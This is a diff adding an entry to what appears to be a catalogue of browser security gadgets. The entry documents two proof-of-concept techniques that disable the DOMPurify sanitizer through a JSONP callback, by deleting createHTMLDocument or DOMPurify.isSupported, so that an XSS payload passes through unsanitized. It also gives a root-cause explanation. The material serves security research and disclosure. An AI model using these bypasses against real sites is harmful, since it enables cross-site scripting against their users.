@@ -2,6 +2,68 @@
 description: DOMPurify - a DOM-only, super-fast, uber-tolerant XSS sanitizer for HTML, MathML and SVG. DOMPurify works with a secure default, but offers a lot of configurability and hooks. https://cure53.de/purify
 github: cure53/DOMPurify
 gadgets:
+  Latest:
+    authors:
+      - twitter:parrot
+      - twitter:xssjp
+    tags:
+      - chrome-browser
+      - firefox-browser
+      - safari-browser
+      - script-tag
+      - src-attr
+      - before-lib-load
+      - func-call-parameter
+    pocs:
+      - description: |
+          In case it is possible to execute limited arbitrary javascript code, like on a `/[\w\s.]/` jsonp endpoint, it is possible to `delete document.implementation.__proto__.createHTMLDocument` before DOMPurify is loaded to disable DOMPurify.
+        code: |
+          <!-- user input -->
+          <!-- Act like this is a JSONP endpoint -->
+          <script src="[current-location]/assets/xss/dompurify-jsonp-1.js?callback=delete document.implementation.__proto__.createHTMLDocument"></script>
+
+          <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.2.6/purify.min.js"></script>
+          <script>
+            // user input
+            const clean = DOMPurify.sanitize("<img src=x onerror=alert(document.domain)>");
+            document.body.innerHTML = clean;
+          </script>
+      - description: |
+          The same can be done after DOMPurify is loaded, by deleting `DOMPurify.isSupported`.
+        code: |
+          <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.2.6/purify.min.js"></script>
+
+          <!-- user input -->
+          <!-- Act like this is a JSONP endpoint -->
+          <script src="[current-location]/assets/xss/dompurify-jsonp-2.js?callback=delete DOMPurify.isSupported"></script>
+
+          <script>
+            // user input
+            const clean = DOMPurify.sanitize("<img src=x onerror=alert(document.domain)>");
+            document.body.innerHTML = clean;
+          </script>
+    more-info: |
+      **Root Cause**
+
+      Source: <a target="_blank" href="https://github.com/cure53/DOMPurify/blob/ec86d9068d4f5a2505b85e12cff9921f304bdda7/src/purify.ts#L193">https://github.com/cure53/DOMPurify/blob/ec86d9068d4f5a2505b85e12cff9921f304bdda7/src/purify.ts#L193</a>
+
+      ```javascript
+      DOMPurify.isSupported =
+        typeof entries === 'function' &&
+        typeof getParentNode === 'function' &&
+        implementation &&
+        implementation.createHTMLDocument !== undefined;
+      ```
+
+      Source: <a target="_blank" href="https://github.com/cure53/DOMPurify/blob/ec86d9068d4f5a2505b85e12cff9921f304bdda7/src/purify.ts#L1479">https://github.com/cure53/DOMPurify/blob/ec86d9068d4f5a2505b85e12cff9921f304bdda7/src/purify.ts#L1479</a>
+
+      ```javascript
+      if (!DOMPurify.isSupported) {
+        return dirty;
+      }
+      ```
+    links:
+      - https://hackmd.io/@hakatashi/HkgG02U4t
   ≤3.1.2:
     authors:
       - twitter:kevin_mizu
